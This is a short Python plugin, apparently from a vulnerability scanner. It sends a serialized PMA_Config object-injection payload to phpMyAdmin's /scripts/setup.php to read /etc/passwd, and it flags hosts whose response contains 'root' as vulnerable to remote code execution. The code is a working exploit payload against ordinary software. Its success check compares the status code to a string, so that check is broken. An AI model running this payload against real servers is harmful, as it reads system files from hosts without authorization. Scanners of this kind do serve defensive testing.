import requests
from lib.verify import get_list
from lib.random_header import get_ua


def check(ip, ports, apps):
    try:
        payload = "/scripts/setup.php"
        data = 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
        probe = get_list(ip, ports)
        for url in probe:
            r = requests.post(url + payload, data=data, timeout=5, headers=get_ua())
            if r.status_code == '200' and 'root' in r.text:
                return url + " Phpmyadmin Setup RCE"
    except Exception as e:
        pass
